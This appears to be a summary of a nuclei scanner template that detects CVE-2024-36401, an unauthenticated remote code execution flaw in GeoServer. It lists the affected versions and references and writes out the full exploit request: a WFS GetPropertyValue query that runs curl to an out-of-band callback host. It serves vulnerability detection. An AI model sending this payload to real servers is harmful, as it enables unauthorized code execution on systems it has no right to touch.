---
cve_id: CVE-2024-36401
template_path: nuclei-templates/http/cves/2024/CVE-2024-36401.yaml
affected_product: GeoServer
severity: critical
authentication: none
external_callback: true
affected_versions: versions prior to 2.25.1, 2.24.3 and 2.23.5
preconditions: default GeoServer installation
poc_classification: rce
---

## Vulnerability

GeoServer versions prior to 2.25.1, 2.24.3, and 2.23.5 contain a critical remote code execution flaw. Multiple OGC request parameters allow unauthenticated attackers to achieve RCE through specially crafted input that is unsafely evaluated as XPath expressions in property name evaluation against a default installation.

## PoC / Detection
Classification: rce

The template first issues a GET to `/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage` and extracts a valid `typeName` value via regex from the response body. It then sends a GET to `/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames={{name}}&valueReference=exec(java.lang.Runtime.getRuntime(),'curl+{{interactsh-url}}')`. Detection succeeds on an interactsh DNS callback plus `application/xml` content-type.

## References
- https://x.com/sirifu4k1/status/1808270303275241607
- https://nvd.nist.gov/vuln/detail/CVE-2024-36401
- https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401
- https://github.com/advisories/GHSA-6jj6-gm7p-fcvv
